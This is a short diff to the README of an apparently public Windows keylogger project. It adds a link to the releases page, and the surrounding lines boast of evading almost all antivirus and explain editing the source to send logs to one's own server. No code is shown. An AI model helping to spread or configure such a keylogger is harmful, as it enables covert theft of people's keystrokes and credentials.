@@ -12,7 +12,7 @@ This keylogger is undetected by 99% of the anti-virus on [**virustotal**](https:
 
 ## Installation
 
-Download the lastest release and install it.
+Download the [lastest release](https://github.com/Darkempire78/Windows-Keylogger/releases/) and install it.
 
 You can edit th lines 18-19 to add your server where send logs :
 ```Csharp
